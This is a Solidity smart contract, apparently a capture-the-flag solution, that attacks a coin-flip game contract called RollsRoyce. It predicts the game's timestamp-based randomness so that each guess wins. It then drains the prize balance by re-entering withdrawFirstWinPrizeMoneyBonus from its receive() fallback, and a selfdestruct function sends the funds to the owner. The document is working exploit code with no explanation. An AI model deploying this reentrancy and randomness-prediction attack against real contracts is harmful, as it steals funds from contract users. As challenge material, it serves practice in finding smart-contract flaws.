//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

enum CoinFlipOption {
    HEAD,
    TAIL
}

interface RollsRoyce {
    function guess(CoinFlipOption _guess) external payable;
    function revealResults() external;
    function withdrawFirstWinPrizeMoneyBonus() external;
    function viewWins(address _addr) external view returns (uint);
}

contract Writeup{
    address payable owner;
    address private target_address = payable("TARGET ADDRESS");
    RollsRoyce private target = RollsRoyce(payable(target_address));
    event Num(uint num);

    constructor() payable {
        owner = payable(msg.sender);
    }

    function flipCoin() private view returns (CoinFlipOption) {
        return
            CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function setup() private {
        for(uint i=0; i<3; i++){
            CoinFlipOption correct_result = flipCoin();
            target.guess{value: 1 ether}(correct_result);
            target.revealResults();
        }
        uint num = target.viewWins(address(this));
        emit Num(num);
    }

    function attack() public {
        setup();
        target.withdrawFirstWinPrizeMoneyBonus();
    }

    function destroy() public {
        selfdestruct(owner);
    }

    receive() external payable {
        if(address(target).balance > 0){
            target.withdrawFirstWinPrizeMoneyBonus();
        }
    }
}
